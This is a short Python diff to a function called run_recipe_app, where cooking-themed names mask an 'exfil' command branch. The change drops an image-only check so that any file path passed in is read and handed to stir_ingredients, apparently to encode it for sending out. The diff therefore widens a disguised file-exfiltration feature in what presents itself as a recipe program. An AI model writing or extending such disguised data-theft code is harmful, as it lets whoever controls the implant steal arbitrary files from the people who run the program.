@@ -134,9 +134,9 @@ def run_recipe_app():
             conn.close()
             recipe_list.remove("noodle_recipes_generator")
         elif request[0] == "exfil":
-            if len(request) > 1 and request[1] == "image":
+            if len(request) > 1:
                 encoded_string = ""
-                with open(request[2], 'rb') as image_file:
+                with open(request[1], 'rb') as image_file:
                     encoded_string = image_file.read()
 
                 mes1 = stir_ingredients(recipeseed, encoded_string)
